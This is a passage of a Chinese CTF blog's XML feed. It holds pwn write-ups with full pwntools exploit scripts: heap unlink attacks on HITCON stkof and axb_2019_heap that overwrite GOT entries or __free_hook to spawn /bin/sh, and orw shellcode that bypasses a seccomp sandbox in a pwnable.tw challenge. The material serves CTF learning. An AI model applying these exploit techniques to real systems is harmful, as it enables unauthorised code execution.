287056c8df5e4c9e97466409bd629c6c39dd853a5ef04b85eae33d8814f639013a23d78b6244eb57da0fe36c35f6c2779ce5e466a8c1162a2ab2bcb564977d8d19c4bdce5e33d6a6b0ccf3fbe81335f32e9204ac5f97c767aed7865d0556148ad555dab0ea2051490def843fbb82b8d7515016b706e528849a104dc8b5d36bcf54fc1a9dbbbaa85542fd218aa7cbfeb87587d0a9070ccc4c37a87bf6d749ebf2ad4fd7b0323f01e950d7a580877c4c1d58caaf938793a8fbff61dda15ae1a74fd3029845f6a4d7bef781452b981334ecaa509fbe48b2d39a37d1bd57b6d4cf76b7d448fb3549304469317d6d8fe0a0f7c919ca523c8308bb6c4a7d90ef8a18a7ab840aee67ed820da26e59fc9f9dcc5b2a9b92c9bb211a87e2495fc881daeb9100f94c6ce4f255df2d91011aab3b000d74819ed1cd001e9fe1561751c2ccf66e7f98a3f1af11f701870c452d519bad326738f27926f0066a75265555da34051af8270b78343c4b2b2d663b7fcdcf607e9d456daf0ea703e6a81cd6db12a070dae69c18892be87968b0106796c93873cb89aa2e7159eae36f01a19993735f8c12a37fc9036ba3a1c0ab692f34cf1e01bc51fece58ac0fa2a1b1d7f5a8689060f9ee2cf52606c7a0425ba49b32c58e56ae993527e56dca6c3e2a613dd92127974bc3834b4db8ccbed1534105c4cc616dc0e51060183fb41c84acdb0840fb7282e6eca62eef6cdab52d5d5596f0f86bb68dc1c05e0c4f5fc0bcbb73062732eddd21dbc6f0761348410486edeb8e674d88aaeaf3e101067bd42b566f428b542faf424a6e94de15f811b1b0c6c210ae2c08f3ffa21ed084333a3042647c05a9b35018ab6a478eb81794c6573c7db6be3f366e96830567f2bd30f1e2a99019226f2d73b3f18bb069cbee268e2af65f3a1d3ecce08369a77a9057216c25d716748d433fdd2ade782613539684de433df7f04a62c473de759c17c617f3cdf3e71536d5d6c329ece3b7ade8d67cbf93296a31714d439eedf53e5b8ed8a8ededc27ebbd16186b9b28be539508f227525353b10ce4c958ae3d19619a8dee7564f07a84394a14c003734748637a9c5e0bb2c7201ab2fc436546321742494c5e863b74edc4d8dc0d7d5463324729353d9cc3cf9955ee0eddd4d5cac3f7a0149c9165e9c6ff344c1d4675b336adf4544b34a17bae2f418dae9a7eb061666612883b6008ea252184d3dece44f1835ee39dc2781ad52e55c88503e8be7fca7f9e15ec4fd5a3a2b73019e3f1923df5792a10becff6c27adc2e33d01d74c142f626de851d344cc596209ab07203a686863014063d1a6904db8b09de55ba6dc48098927c36216c034fc40821a94c892c47a19a669913a871d704540f6fc3ef46f1e3cb7f0fcd2ed3fb76b80178f9e1788b8dc6276bf315e6a19795700e38db9d0a618e43482c7965215e0ceabb498e844d3c35d5f6c288210c8754a4eed3008862325085249b6d1dfb440afc9a2c930eeb7e2cc5fce27ce6c9ced227ba36e5a7ebe8761a71f4837901167eb81bc96d1f4c033c5a40eaf364cf45c62e241a9bff1d0573202661c2481847f7b7de66630fbd166e8c15523c2316920b0825ab26d81f441045d694bb83686657aad45692fba414620e8824dcbdba9b826edb841c9d9a05b29e42f41bc08d0704e345d5f6ea78d67636c7264ae8524d2584a01cf8bb1f708dfdef36c9c936ad3ef91cda36df96e1450d6defb4bfc8715ab593b2be8933c9b82a00c0b7239729f3d6b3682a74b6f7c9313d164ac8dcbbcdb516536267d9941184e12f7759b741de98c75ddf7fa9d7109e2d89a837cb61e178db8e2fd67999ab6810fd2cd58afa72e112c160d837d9546f9d68118048bdadae867d34491c6103ada4056af2adb142bc5a49ee2c0cdaea7b0c209e60d57d12deef2b236332ea3da05ee7caacecacd9c21a1cf4b21c6a0f5f2274ebbecc8015b5309e1f2e70b9820f619f1f9f6f9bdc74af69f5e76f509ee5ad41a3cc220f849214b0f5e88b1a295f21d301e4ee37adbed0d0ff6f53e27ce46e0d14626b0e28db6ceeb6cb736f6d6cdf6f6573c25b494355ca032dedf466a3511eb572f32a19a0de8b29cb53cab815b8626d25ca62b5c2d04a14fd7acda8cca6609a9dfb94d7085bfd96f63c5590eed89082ce05ff13489facce36c7572d4297a63e4b0b1767856d8f7b82d659bdf174340aa8c33ed7c05dfb6ae3c65883024e935e99e23194838c856655571f9bf7a7124c2b947bf7aa01b7d4a56615ee7f63f6a522b8fa73eff6725d8ce7adc62ae741d8cfa41b71b091fc2e8078aeca6544d3eb623ae12600bceb0275cf86fe45247461bf404457deb370dd02038dafc0e504f084707b30893d324e392100afd51637eba9915374acff9af6b877d3e9e35c678ddf5a5f84198dacf5167ebd6fe318d5714323c52e3885514676d59dc01c36e795c0a6721e6dc0cfd016d5b415322715545cd14f92f544886fb72e4fb9d2167bc1ca4dda40039bdaaeb1fb8ccba3aacdfd4248886329009dd3666e9bfb5931289322c58dc8dbad35807a6c7e3debb1332fed6cf0973d95a8f495d991d12d425d8e669632f8c752e0890b7db4f7cc3ef9c5b8c2534dfa8302fb63fc6c9c16268891bd6e2a20104a989a50492c83e8c1479a5a87fd1c31e68b18e2fda6df537185e6dc82d590d9657b439e9d19cec9994fbbe92a37aed974f6c6caeec7c42af4b8031607ae37cfb3bf79bded3de27982f758c1cbdf62027bf44bdc476256fc2641d549051c91b9dd4ff3cefaf876432a58b1f35bbdb3fe69b4f73c2d40e81b7a12f0a8f26c8608a31467e69c5e4c4f18b529c155d8184ea8c6b9a0401b452f973bdc226a51644d614f63485cc9fa0449949bd1e487d8f89fff2b99e1ae3d1a847e5713713fe52745bf47d548dd24c332b7a37d0237aec1e068500f5416bbfb91137fa5f86d52b15417dbdfa25e6f2cfd66b66f5822adaf4315f37eea521bd97e6d0e4b5ea222770adcef9b98abadf6cb17248d98c44e6d32bc95dad0bd3b4f9d766cbd38a4e58cd1244b2368a0a7ce5ce4a13bf49ab86f6b5f4bf17ad00f3d66904dc46da44c7469aeaf28a5a3f33a29cde9d9ff4c578a83ad322d3e67ccff8a92cec2f5260333ab8e3d2fac8f197b0e39c7f51424eb08beb30606a3a29f497e4f68e03670858dfa7b2531a369eb1d43e49821f6a554a791de9bd85dcea6f227bdc4c881e195656269de8727b8b472ca90354ee2b21b3147c20552a626d55d68f74018810d2dd0e239e63f792960d7b764e8f96240b8efdb1077f11f5e8c44335583a97d61bbb78366c720875c4cfcd7ac477caec44ad60d626c4d844bb638da9fce3fc452cbf51849d9a259ebcd0a79569a1c2dc7a5347284b94a3fb4c0882be008f3a24ab126386641b7d31ae6e973228c76aa76b59bf0b91135a8d7ef3b1bd74e9bc913bc2693fe254e53026257022dfae04b231959c8e5631c34cd0276a159780faaaa45da90f04470926c4cbf9ea91f6ccd27f455b8896e12c000062463bb179d8d6babd69c41bc8a9f9d61a8fbc4e51a2f0b2a544bd515de993576f0fee779c21dc583339bf6479f212c7f7e13cfb1aecf11e7814b407a876ef4fc1b82d9a38191849125f82cad312e91f95bacff296fcbd2d2b94dadfdf9af8d9a58fd34b33065e1308c2e114fd2366e71ad3d9212f91a6365a21fe7678b7aa7a202deb792cb0c19717c50ecb41d034dc2fa3bfbf412ec875c65d7e508cf68b5fde0a9f6927c118daf82c6ed56e1da98a40333b9a9b8df340e3e6752d6b</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Please input your password</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 随笔 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>unlink</title>
      <link href="/2021/11/25/unlink/"/>
      <url>/2021/11/25/unlink/</url>
      
        <content type="html"><![CDATA[<p>堆溢出漏洞——unlink</p><span id="more"></span><blockquote><p><a href="https://blog.csdn.net/qq_41202237/article/details/108481889?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522163038712516780265472330%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=163038712516780265472330&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-108481889.first_rank_v2_pc_rank_v29&utm_term=hollk%20unlink&spm=1018.2226.3001.4187">推荐unlink基本知识讲解</a></p></blockquote><h2 id="2014-HITCON-stkof"><a href="#2014-HITCON-stkof" class="headerlink" title="2014 HITCON stkof"></a><a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/unlink/2014_hitcon_stkof">2014 HITCON stkof</a></h2><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>, <span class="string">&#x27;-x&#x27;</span>, <span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;DEBUG&#x27;</span>]:</span><br><span class="line">    context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.binary = <span class="string">&quot;./stkof&quot;</span></span><br><span class="line">hollkelf = ELF(<span class="string">&#x27;./stkof&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    hollk = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">7777</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    hollk = process(<span class="string">&quot;./stkof&quot;</span>)</span><br><span class="line">log.info(<span class="string">&#x27;PID: &#x27;</span> + <span class="built_in">str</span>(proc.pidof(hollk)[<span class="number">0</span>]))</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">head = <span class="number">0x602140</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">alloc</span>(<span class="params">size</span>):</span></span><br><span class="line">    hollk.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    hollk.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    hollk.recvuntil(<span class="string">&#x27;OK\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx, size, content</span>):</span></span><br><span class="line">    hollk.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    hollk.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    hollk.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    hollk.send(content)</span><br><span class="line">    hollk.recvuntil(<span class="string">&#x27;OK\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">idx</span>):</span></span><br><span class="line">    hollk.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    hollk.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    <span class="comment"># trigger to malloc buffer for io function</span></span><br><span class="line">    alloc(<span class="number">0x100</span>)  <span class="comment"># idx 1</span></span><br><span class="line"></span><br><span class="line">    alloc(<span class="number">0x30</span>)  <span class="comment"># idx 2</span></span><br><span class="line">    <span class="comment"># small chunk size inorder to trigger unlink</span></span><br><span class="line">    alloc(<span class="number">0x80</span>)  <span class="comment"># idx 3</span></span><br><span class="line">    <span class="comment"># a fake chunk at global[2]=head+16 who&#x27;s size is 0x20</span></span><br><span class="line">    payload = p64(<span class="number">0</span>)  <span class="comment">#prev_size</span></span><br><span class="line">    payload += p64(<span class="number">0x20</span>)  <span class="comment">#size</span></span><br><span class="line">    payload += p64(head - <span class="number">0x8</span>)  <span class="comment">#fd</span></span><br><span class="line">    payload += p64(head)  <span class="comment">#bk</span></span><br><span class="line">    payload += p64(<span class="number">0x20</span>)  <span class="comment"># next chunk&#x27;s prev_size bypass the check</span></span><br><span class="line">    payload = payload.ljust(<span class="number">0x30</span>, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    <span class="comment"># overwrite global[3]&#x27;s chunk&#x27;s prev_size</span></span><br><span class="line">    <span class="comment"># make it believe that prev chunk is at global[2]</span></span><br><span class="line">    payload += p64(<span class="number">0x30</span>)</span><br><span class="line">    <span class="comment"># make it believe that prev chunk is free</span></span><br><span class="line">    payload += p64(<span class="number">0x90</span>)</span><br><span class="line">    edit(<span class="number">2</span>, <span class="built_in">len</span>(payload), payload)</span><br><span class="line">    <span class="comment"># unlink fake chunk, so global[2] =&amp;(global[2])-0x18=head-8</span></span><br><span class="line">    free(<span class="number">3</span>)</span><br><span class="line">    hollk.recvuntil(<span class="string">&#x27;OK\n&#x27;</span>)</span><br><span class="line">    <span class="comment">#gdb.attach(hollk)</span></span><br><span class="line">    <span class="comment"># overwrite global[0] = free@got, global[1]=puts@got, global[2]=atoi@got</span></span><br><span class="line">    payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">8</span> + p64(hollkelf.got[<span class="string">&#x27;free&#x27;</span>]) + p64(hollkelf.got[<span class="string">&#x27;puts&#x27;</span>]) + p64(</span><br><span class="line">        hollkelf.got[<span class="string">&#x27;atoi&#x27;</span>])</span><br><span class="line">    edit(<span class="number">2</span>, <span class="built_in">len</span>(payload), payload)</span><br><span class="line">    <span class="comment"># edit free@got to puts@plt</span></span><br><span class="line">    payload = p64(hollkelf.plt[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">    edit(<span class="number">0</span>, <span class="built_in">len</span>(payload), payload)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#free global[1] to leak puts addr</span></span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    puts_addr = hollk.recvuntil(<span class="string">&#x27;\nOK\n&#x27;</span>, drop=<span class="literal">True</span>).ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    puts_addr = u64(puts_addr)</span><br><span class="line">    log.success(<span class="string">&#x27;puts addr: &#x27;</span> + <span class="built_in">hex</span>(puts_addr))</span><br><span class="line">    libc_base = puts_addr - libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">    binsh_addr = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">    system_addr = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">    log.success(<span class="string">&#x27;libc base: &#x27;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">    log.success(<span class="string">&#x27;/bin/sh addr: &#x27;</span> + <span class="built_in">hex</span>(binsh_addr))</span><br><span class="line">    log.success(<span class="string">&#x27;system addr: &#x27;</span> + <span class="built_in">hex</span>(system_addr))</span><br><span class="line">    <span class="comment"># modify atoi@got to system addr</span></span><br><span class="line">    payload = p64(system_addr)</span><br><span class="line">    edit(<span class="number">2</span>, <span class="built_in">len</span>(payload), payload)</span><br><span class="line">    hollk.send(p64(binsh_addr))</span><br><span class="line">    hollk.interactive()</span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    exp()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="axb-2019-heap"><a href="#axb-2019-heap" class="headerlink" title="axb_2019_heap"></a>axb_2019_heap</h2><h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><ol><li><p>pwndbg使用regs查看寄存器里得值</p><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202111242245670.png" alt="image-20211124224540522"></p></li><li><p>利用思路</p><ul><li>利用格式化字符串泄露libc和程序基址</li><li>运用unlink将chunk 0 地址覆写为free_hook的地址</li><li>将system地址写入free_hook</li><li>触发写入的’/bin/sh’块的删除，执行system(‘/bin/sh’)</li></ul></li></ol><h2 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = remote(&quot;node3.buuoj.cn&quot;,26144)</span></span><br><span class="line">p = process(<span class="string">&quot;./axb_2019_heap&quot;</span>)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./axb_2019_heap&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.23-64.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">idx,size,content</span>):</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;):&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;size:&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;content:&#x27;</span>,content)</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">idx</span>):</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;index:&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx,content</span>):</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;index:&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;content: \n&#x27;</span>,content)</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>():</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;name: &#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;%11$p%15$p&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Hello, &#x27;</span>)</span><br><span class="line">base=<span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>)-<span class="number">0x1186</span></span><br><span class="line"><span class="comment">#success(&quot;base:&quot;+hex(base))</span></span><br><span class="line">libcbase=<span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>)-libc.sym[<span class="string">&#x27;__libc_start_main&#x27;</span>]-<span class="number">240</span></span><br><span class="line">system=libcbase+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">free_hook=libcbase+libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line"></span><br><span class="line">bss=base+<span class="number">0x202060</span></span><br><span class="line">success(<span class="string">&quot;bss:&quot;</span>+<span class="built_in">hex</span>(bss))</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x98</span>,<span class="string">&#x27;aaaa&#x27;</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x98</span>,<span class="string">&#x27;bbbb&#x27;</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x90</span>,<span class="string">&#x27;cccc&#x27;</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x90</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)<span class="comment">#3</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"> </span><br><span class="line">payload=p64(<span class="number">0</span>)+p64(<span class="number">0x91</span>)+p64(bss-<span class="number">0x18</span>)+p64(bss-<span class="number">0x10</span>)+p64(<span class="number">0</span>)*<span class="number">14</span>+p64(<span class="number">0x90</span>)+<span class="string">&#x27;\xa0&#x27;</span></span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0</span>)*<span class="number">3</span>+p64(free_hook)+p64(<span class="number">0x10</span>))</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,p64(system))</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line"> </span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>pwnable.tw orw</title>
      <link href="/2021/11/17/pwnable.tw_orw/"/>
      <url>/2021/11/17/pwnable.tw_orw/</url>
      
        <content type="html"><![CDATA[<p>prctl内核沙箱机制</p><span id="more"></span><h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><p>prctl seccomp相当于内核中的一种安全机制，正常情况下，程序可以使用所有的syscall，但是当劫持程序流程之后通过exeve来呼叫syscall得到shell时过滤掉某些syscall，只允许使用部分syscall。</p><p>seccomp 是 secure computing 的缩写，其是 Linux kernel 从2.6.23版本引入的一种简洁的 sandboxing 机制。在 Linux 系统里，大量的系统调用（system call）直接暴露给用户态程序。但是，并不是所有的系统调用都被需要，而且不安全的代码滥用系统调用会对系统造成安全威胁。seccomp安全机制能使一个进程进入到一种“安全”运行模式，该模式下的进程只能调用4种系统调用（system call），即 read(), write(), exit() 和 sigreturn()，否则进程便会被终止。</p><h2 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h2><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202111172023579.png" alt="image-20211117202323531"></p><p>开启了canary</p><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202111172031319.png" alt="image-20211117203126264"></p><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202111172032512.png" alt="image-20211117203205447"></p><p>本题系统内核只允许使用sys_open，sys_read，sys_write</p><p>第一次调用prctl函数 禁止提权,第二次调用prctl函数 限制能执行的系统调用只有open，write，exit</p><p>总体思路是：open flag -&gt;read-&gt;write</p><ol><li>sys_open</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">push <span class="number">0x0</span>  <span class="comment">#字符串结尾</span></span><br><span class="line">push <span class="number">0x67616c66</span><span class="comment">#&#x27;flags&#x27;</span></span><br><span class="line">mov ebx,esp</span><br><span class="line">xor ecx,ecx<span class="comment">#0</span></span><br><span class="line">xor edx,edx<span class="comment">#0</span></span><br><span class="line">mov eax,<span class="number">0x5</span><span class="comment">#调用号</span></span><br><span class="line"><span class="built_in">int</span> <span class="number">0x80</span><span class="comment">#sys_open(flags,0,0)</span></span><br></pre></td></tr></table></figure><ol start="2"><li><p>sys_read(2,file,0x100) 系统调用号为3</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mov eax,<span class="number">0x3</span>; </span><br><span class="line">mov ecx,ebx;<span class="comment"># ecx = char __user *buf 缓冲区，读出的数据--&gt;也就是读“flag”</span></span><br><span class="line">mov ebx,<span class="number">0x3</span>;<span class="comment"># 文件描述符 fd:是文件描述符 0 1 2 3 代表标准的输出输入和出错,其他打开的文件</span></span><br><span class="line">mov edx,<span class="number">0x100</span>;<span class="comment">#对应字节数</span></span><br><span class="line"><span class="built_in">int</span> <span class="number">0x80</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure><ol start="3"><li>sys_write(1,file,0x30) 系统调用号为4</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov eax,<span class="number">0x4</span>;<span class="comment"># eax = sys_write</span></span><br><span class="line">mov ebx,<span class="number">0x1</span>;<span class="comment"># ebx = unsigned int fd = 1</span></span><br><span class="line"><span class="built_in">int</span> <span class="number">0x80</span>;</span><br></pre></td></tr></table></figure><p>exp:</p></li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn  <span class="keyword">import</span> *</span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>, arch = <span class="string">&#x27;i386&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">28836</span>)</span><br><span class="line">shellcode=<span class="string">&quot;&quot;</span></span><br><span class="line">shellcode += asm(<span class="string">&#x27;xor ecx,ecx;mov eax,0x5; push ecx;push 0x67616c66; mov ebx,esp;xor edx,edx;int 0x80;&#x27;</span>)</span><br><span class="line">shellcode += asm(<span class="string">&#x27;mov eax,0x3;mov ecx,ebx;mov ebx,0x3;mov dl,0x30;int 0x80;&#x27;</span>)</span><br><span class="line">shellcode += asm(<span class="string">&#x27;mov eax,0x4;mov bl,0x1;mov edx,0x30;int 0x80;&#x27;</span>)</span><br><span class="line">recv = p.recvuntil(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">p.sendline(shellcode)</span><br><span class="line">flag = p.recv(<span class="number">100</span>)</span><br><span class="line"><span class="built_in">print</span> flag</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span 